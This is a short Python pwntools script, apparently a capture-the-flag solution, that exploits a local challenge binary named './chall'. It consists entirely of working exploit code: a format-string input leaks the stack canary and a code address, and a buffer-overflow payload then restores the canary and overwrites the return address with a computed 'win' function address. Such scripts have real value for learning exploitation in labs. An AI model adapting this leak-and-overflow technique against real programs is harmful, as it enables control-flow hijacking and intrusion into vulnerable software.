from pwn import *

target = process("./chall")

target.sendline(b"%13$p,%7$p")
target.recvuntil("Hello, 0x")
canary = target.recvuntil(",0x")[:-3]
hint = target.recvuntil(".")[:-1]
print("hint",hint)
print("canary",canary)

win = int(hint, 16) - 0x2A4F
canary = int(canary,16)


payload = b"A" * 24
payload += p64(canary)
payload += b"B" * 8
payload += p64(win)

target.sendline(payload)

s = target.recvall().decode()
print(s)

